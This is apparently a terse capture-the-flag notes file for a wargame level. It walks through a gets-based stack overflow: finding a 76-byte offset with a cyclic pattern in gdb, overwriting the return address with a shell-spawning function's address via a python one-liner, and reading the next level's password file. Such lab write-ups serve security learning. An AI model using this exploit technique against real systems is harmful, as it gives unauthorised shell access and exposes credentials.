binary has a call to gets we can overflow
run level1 in gdb with pattern to get the offset
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
offset is 76
we need to pass the address of fonction run that spawns a shell at 0x08048444
python -c 'print("a" * 76 + "\x08\x04\x84\x44"[::-1])' > /tmp/test
cat /tmp/test - | ./level1
Good... Wait what?
cat /home/user/level2/.pass
